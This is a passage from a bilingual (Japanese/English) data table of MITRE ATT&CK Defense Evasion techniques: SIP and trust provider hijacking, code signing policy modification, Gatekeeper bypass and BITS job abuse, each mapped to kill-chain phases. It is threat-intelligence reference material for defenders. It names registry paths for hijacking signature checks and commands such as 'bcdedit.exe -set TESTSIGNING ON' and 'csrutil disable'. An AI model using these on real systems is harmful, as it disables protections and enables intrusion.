Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1553,信頼制御の破壊,Subvert Trust Controls,"攻撃者は、信頼できないアクティビティについてユーザーに警告したり、信頼できないプログラムの実行を防いだりするセキュリティ制御を弱体化させる可能性があります。オペレーティングシステムやセキュリティ製品には、プログラムやWebサイトがある程度の信頼レベルを持っていると識別するメカニズムが含まれている場合があります。このような機能の例としては、有効なコード署名証明書によって署名されているためにプログラムの実行が許可されること、インターネットからダウンロードされた属性セットを持っているためにプログラムがユーザーに警告を表示すること、または信頼できないサイトに接続しようとしていることを示す表示が表示されることなどがあります。

攻撃者はこれらの信頼メカニズムを破壊しようとする可能性があります。攻撃者が使用する方法は、破壊しようとする特定のメカニズムによって異なります。攻撃者は、これらの制御を破壊することを支援するために、[ファイルおよびディレクトリのアクセス許可の変更](https://attack.mitre.org/techniques/T1222)または[レジストリの変更](https://attack.mitre.org/techniques/T1112)を実行する可能性があります。(引用: SpectorOps Subverting Trust Sept 2017) 攻撃者はまた、ターゲットシステム上で信頼を得るためにコード署名証明書を作成または盗む可能性もあります。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates)","Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.

Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates)",T1553.003,SIPおよび信頼プロバイダーハイジャック,SIP and Trust Provider Hijacking,"攻撃者は、署名検証チェックを実行する際にオペレーティングシステムやアプリケーション制御ツールを誤解させるために、SIPおよび信頼プロバイダーコンポーネントを改ざんする可能性があります。ユーザーモードでは、Windows Authenticode（引用: Microsoft Authenticode）デジタル署名は、ファイルの出所と整合性を検証するために使用されます。これらは、署名済みコードの信頼を確立するために使用できる変数です（例：有効なMicrosoft署名を持つドライバーは安全として扱われる場合があります）。署名検証プロセスは、WinVerifyTrustアプリケーションプログラミングインターフェイス（API）関数を介して処理されます（引用: Microsoft WinVerifyTrust）。この関数は照会を受け付け、署名のパラメータを検証する責任を負う適切な信頼プロバイダーと連携します。(引用: SpectorOps Subverting Trust Sept 2017)

実行可能ファイルの種類や対応する署名形式がさまざまであるため、MicrosoftはAPI関数とファイルの間の抽象化レイヤーを提供するために、サブジェクトインターフェイスパッケージ（SIP）と呼ばれるソフトウェアコンポーネントを作成しました。(引用: EduardosBlog SIPs July 2008) SIPは、API関数が署名を作成、取得、計算、検証できるようにする責任を負います。ほとんどのファイル形式（実行可能ファイル、PowerShell、インストーラーなど。カタログ署名は包括的なものを提供します(引用: Microsoft Catalog Files and Signatures April 2017)）には一意のSIPが存在し、グローバル一意識別子（GUID）によって識別されます。(引用: SpectorOps Subverting Trust Sept 2017)

[コード署名](https://attack.mitre.org/techniques/T1553/002)と同様に、敵対者はこのアーキテクチャを悪用して信頼制御を破壊し、正当に署名されたコードのみがシステム上で実行されることを許可するセキュリティポリシーをバイパスする可能性があります。敵対者は、SIPおよび信頼プロバイダーコンポーネントをハイジャックして、オペレーティングシステムおよびアプリケーション制御ツールを誤解させ、悪意のある（または任意の）コードを次のように署名済みとして分類させる可能性があります。(引用：SpectorOps Subverting Trust Sept 2017)

* SIPのCryptSIPDllGetSignedDataMsg関数（署名済みファイルからエンコードされたデジタル証明書を取得する）を提供するダイナミックリンクライブラリ（DLL）を指す<code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code>の<code>Dll</code>および<code>FuncName</code>レジストリ値を変更します。ファイルの実際の署名ではなく、既知の良好な署名値（例：ポータブル実行可能ファイルのMicrosoft署名）を常に返すエクスポート関数を持つ悪意のある細工されたDLLを指すことにより、敵対者はそのSIPを使用するすべてのファイルに許容可能な署名値を適用できます（引用：GitHub SIP POC Sept 2017）（ただし、関数によって返されるハッシュがファイルから計算された値と一致しないため、ハッシュの不一致が発生し、署名が無効になる可能性があります）。
* SIPのCryptSIPDllVerifyIndirectData関数（ファイルの計算済みハッシュと署名済みハッシュ値を検証する）を提供するDLLを指す<code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code>の<code>Dll</code>および<code>FuncName</code>レジストリ値を変更します。常にTRUE（検証が成功したことを示す）を返すエクスポート関数を持つ悪意のある細工されたDLLを指すことにより、敵対者はそのSIPを使用して（前述のCryptSIPDllGetSignedDataMsg関数をハイジャックするかどうかにかかわらず）任意のファイル（正当な署名を持つ）を正常に検証できます（引用：GitHub SIP POC Sept 2017）。このレジストリ値は、ディスク上に新しいファイルをドロップして実行する必要性を回避し、既に存在するDLLの適切なエクスポート関数にリダイレクトすることもできます。
* 信頼プロバイダーのFinalPolicy関数（デコードおよび解析された署名がチェックされ、信頼決定の大部分が行われる場所）を提供するDLLを指す<code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code>の<code>DLL</code>および<code>Function</code>レジストリ値を変更します。SIPのCryptSIPDllVerifyIndirectData関数をハイジャックするのと同様に、この値は既に存在するDLLまたは悪意のある細工されたDLL（信頼プロバイダーの実装は複雑ですが）の適切なエクスポート関数にリダイレクトできます。
* **注:** 上記のハイジャックは、[DLL](https://attack.mitre.org/techniques/T1574/001)検索順序ハイジャックを介してレジストリを変更することなく実行することも可能です。

SIPまたは信頼プロバイダーコンポーネントをハイジャックすると、これらの悪意のあるコンポーネントがコード署名または署名検証を実行する任意のアプリケーションによって呼び出される可能性があるため、永続的なコード実行も可能になる場合があります。(引用: SpectorOps Subverting Trust Sept 2017)","Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)

Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)

Similar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)

* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).
* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.
* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).
* **Note:** The above hijacks are also possible without modifying the Registry via [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.

Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1553,信頼制御の破壊,Subvert Trust Controls,"攻撃者は、信頼できないアクティビティについてユーザーに警告したり、信頼できないプログラムの実行を防いだりするセキュリティ制御を弱体化させる可能性があります。オペレーティングシステムやセキュリティ製品には、プログラムやWebサイトがある程度の信頼レベルを持っていると識別するメカニズムが含まれている場合があります。このような機能の例としては、有効なコード署名証明書によって署名されているためにプログラムの実行が許可されること、インターネットからダウンロードされた属性セットを持っているためにプログラムがユーザーに警告を表示すること、または信頼できないサイトに接続しようとしていることを示す表示が表示されることなどがあります。

攻撃者はこれらの信頼メカニズムを破壊しようとする可能性があります。攻撃者が使用する方法は、破壊しようとする特定のメカニズムによって異なります。攻撃者は、これらの制御を破壊することを支援するために、[ファイルおよびディレクトリのアクセス許可の変更](https://attack.mitre.org/techniques/T1222)または[レジストリの変更](https://attack.mitre.org/techniques/T1112)を実行する可能性があります。(引用: SpectorOps Subverting Trust Sept 2017) 攻撃者はまた、ターゲットシステム上で信頼を得るためにコード署名証明書を作成または盗む可能性もあります。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates)","Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.

Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates)",T1553.006,コード署名ポリシーの変更,Code Signing Policy Modification,"攻撃者は、署名なしまたは自己署名コードの実行を可能にするために、コード署名ポリシーを変更する可能性があります。コード署名は、開発者からのプログラムの信頼性のレベルと、プログラムが改ざんされていないことの保証を提供します。セキュリティ制御には、有効な署名済みコードのみがオペレーティングシステムで実行されることを保証するための強制メカニズムが含まれる場合があります。

これらのセキュリティコントロールの一部は、Windowsのドライバー署名強制（DSE）やmacOSのシステム整合性保護（SIP）など、デフォルトで有効になっている場合があります。(引用: Microsoft DSE June 2017)(引用: Apple Disable SIP) その他のそのようなコントロールはデフォルトでは無効になっている場合がありますが、署名済みのダイナミックリンクライブラリ（DLL）のみがシステム上で実行されることを許可するなど、アプリケーションコントロールを通じて構成可能です。開発者がアプリケーションの開発およびテスト中にデフォルトの署名強制ポリシーを変更すると便利な場合があるため、昇格された権限でこれらの機能を無効にできる場合があります。(引用: Microsoft Unsigned Driver Apr 2017)(引用: Apple Disable SIP)

敵対者は、コマンドラインやGUIユーティリティの使用、[レジストリの変更](https://attack.mitre.org/techniques/T1112)、デバッグ/リカバリモードでのコンピュータの再起動、またはカーネルメモリ内の変数の値を変更するなど、多くの方法でコード署名ポリシーを変更する可能性があります。(引用: Microsoft TESTSIGNING Feb 2021)(引用: Apple Disable SIP)(引用: FireEye HIKIT Rootkit Part 2)(引用: GitHub Turla Driver Loader) システムのコード署名ポリシーを変更できるコマンドの例としては、Windowsの<code>bcdedit.exe -set TESTSIGNING ON</code>やmacOSの<code>csrutil disable</code>などがあります。(引用：Microsoft TESTSIGNING Feb 2021)(引用：Apple Disable SIP) 実装によっては、署名ポリシーの変更に成功すると、侵害されたシステムの再起動が必要になる場合があります。さらに、一部の実装では、ユーザーに表示されるアーティファクト（画面の隅にシステムがテストモードであることを示す透かしなど）が導入される場合があります。攻撃者はそのようなアーティファクトを削除しようとする場合があります。(引用: F-Secure BlackEnergy 2014)

署名チェックに関連する変数（ドライバー署名強制を無効にするための<code>g_CiOptions</code>の変更など）を変更するためにカーネルメモリへのアクセスを取得するには、攻撃者は署名済みだが脆弱なドライバーを使用して[権限昇格のための悪用](https://attack.mitre.org/techniques/T1068)を実行する可能性があります。(引用: Unit42 AcidBox June 2020)(引用: GitHub Turla Driver Loader)","Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system.

Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)

Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)

To gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1553,信頼制御の破壊,Subvert Trust Controls,"攻撃者は、信頼できないアクティビティについてユーザーに警告したり、信頼できないプログラムの実行を防いだりするセキュリティ制御を弱体化させる可能性があります。オペレーティングシステムやセキュリティ製品には、プログラムやWebサイトがある程度の信頼レベルを持っていると識別するメカニズムが含まれている場合があります。このような機能の例としては、有効なコード署名証明書によって署名されているためにプログラムの実行が許可されること、インターネットからダウンロードされた属性セットを持っているためにプログラムがユーザーに警告を表示すること、または信頼できないサイトに接続しようとしていることを示す表示が表示されることなどがあります。

攻撃者はこれらの信頼メカニズムを破壊しようとする可能性があります。攻撃者が使用する方法は、破壊しようとする特定のメカニズムによって異なります。攻撃者は、これらの制御を破壊することを支援するために、[ファイルおよびディレクトリのアクセス許可の変更](https://attack.mitre.org/techniques/T1222)または[レジストリの変更](https://attack.mitre.org/techniques/T1112)を実行する可能性があります。(引用: SpectorOps Subverting Trust Sept 2017) 攻撃者はまた、ターゲットシステム上で信頼を得るためにコード署名証明書を作成または盗む可能性もあります。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates)","Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.

Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates)",T1553.001,Gatekeeperバイパス,Gatekeeper Bypass,"攻撃者はファイル属性を変更し、Gatekeeper機能を破壊してユーザープロンプトを回避し、信頼できないプログラムを実行する可能性があります。Gatekeeperは、Appleのセキュリティモデルのレイヤーとして機能し、信頼できるアプリケーションのみがホスト上で実行されることを保証する一連のテクノロジです。GatekeeperはSnow Leopard（10.6、2009）のファイル検疫に基づいて構築され、コード署名、セキュリティポリシーコンプライアンス、公証などを含むように成長しました。Gatekeeperはまた、初めて実行されるアプリケーションを再開されたアプリケーションとは異なる方法で扱います。(引用: TheEclecticLightCompany Quarantine and the flag)(引用: TheEclecticLightCompany apple notarization)

オプトインシステムに基づいて、ファイルがダウンロードされると、ダウンロードを実行するアプリケーションによってファイルに<code>com.apple.quarantine</code>（検疫フラグとも呼ばれる）という拡張属性（xattr）が設定されることがあります。Launch Servicesはアプリケーションを中断状態で開きます。検疫フラグが設定された初回実行アプリケーションの場合、Gatekeeperは次の機能を実行します：

1. 拡張属性の確認 – Gatekeeperは検疫フラグを確認し、実行を許可または拒否するためのアラートプロンプトをユーザーに表示します。(引用: OceanLotus for OS X)(引用: 20 macOS Common Tools and Techniques)

2. システムポリシーの確認 - Gatekeeperはシステムのセキュリティポリシーを確認し、App Storeのみ、またはApp Storeと確認済みの開発者からのアプリの実行を許可します。

3. コード署名 – GatekeeperはApple Developer IDからの有効なコード署名を確認します。

4. 公証 - Gatekeeperは<code>api.apple-cloudkit.com</code> APIを使用してAppleサーバーに接続し、公証チケットを検証または取得し、チケットが失効していないことを確認します。ユーザーは公証を上書きでき、その結果、「未承認のアプリ」を実行するプロンプトが表示され、セキュリティポリシーが変更されます。

敵対者は、ロジックエラー（例：[防御回避のための悪用](https://attack.mitre.org/techniques/T1211)）、チェックされていないファイルタイプ、外部ライブラリを介して、Gatekeeperチェック内の1つまたは複数のセキュリティ制御を破壊する可能性があります。例えば、macOS 13 Venturaより前では、コード署名と公証チェックは最初の起動時にのみ実行されていたため、攻撃者はGatekeeperセキュリティチェックをバイパスするために、以前に開かれたアプリケーションに悪意のある実行可能ファイルを書き込むことができました。(引用: theevilbit gatekeeper bypass 2021)(引用: Application Bundle Manipulation Brandon Dalton)

USBフラッシュドライブ、光学ディスク、外付けハードドライブ、ローカルネットワーク経由で共有されたドライブからシステムにロードされたアプリケーションやファイル、またはcurlコマンドを使用してロードされたアプリケーションやファイルは、検疫フラグを設定しない場合があります。さらに、[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)を使用して検疫フラグの設定を回避することも可能です。","Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: TheEclecticLightCompany apple notarization )

Based on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:

1. Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS Common Tools and Techniques)

2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.

3. Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID.

4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an “unauthorized app” and the security policy will be modified.

Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)

Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1197,BITSジョブ,BITS Jobs,"攻撃者はBITSジョブを悪用して、コードを永続的に実行したり、さまざまなバックグラウンドタスクを実行したりする可能性があります。Windows Background Intelligent Transfer Service (BITS) は、[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001) (COM) を介して公開される低帯域幅の非同期ファイル転送メカニズムです。(引用: Microsoft COM)(引用: Microsoft BITS) BITSは、他のネットワークアプリケーションを中断することなくバックグラウンドで（利用可能なアイドル帯域幅を使用して）動作することを好むアップデーター、メッセンジャー、およびその他のアプリケーションによって一般的に使用されます。ファイル転送タスクはBITSジョブとして実装され、1つ以上のファイル操作のキューが含まれています。

BITSジョブを作成および管理するためのインターフェイスは、[PowerShell](https://attack.mitre.org/techniques/T1059/001)および[BITSAdmin](https://attack.mitre.org/software/S0190)ツールを介してアクセスできます。(引用: Microsoft BITS)(引用: Microsoft BITSAdmin)

攻撃者はBITSを悪用して、悪意のあるコードのダウンロード（例：[イングレスツール転送](https://attack.mitre.org/techniques/T1105)）、実行、さらには実行後のクリーンアップ（例：[インジケーター削除](https://attack.mitre.org/techniques/T1070)）を行う可能性があります。BITSタスクは新しいファイルやレジストリの変更なしにBITSジョブデータベースに自己完結しており、多くの場合ホストファイアウォールによって許可されています。(引用: CTU BITS Malware June 2016)(引用: Mondok Windows PiggyBack BITS May 2007)(引用: Symantec BITS May 2007) BITSによる実行はまた、長期間有効なジョブを作成したり（デフォルトの最大有効期間は90日であり、延長可能）、ジョブの完了時またはエラー時（システムの再起動後を含む）に任意のプログラムを呼び出したりすることにより、永続性を可能にする場合もあります。(引用: PaloAlto UBoatRAT Nov 2017)(引用: CTU BITS Malware June 2016)

BITSアップロード機能は、[代替プロトコル経由のデータ持ち出し](https://attack.mitre.org/techniques/T1048)を実行するためにも使用できます。(引用: CTU BITS Malware June 2016)","Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)

Adversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)

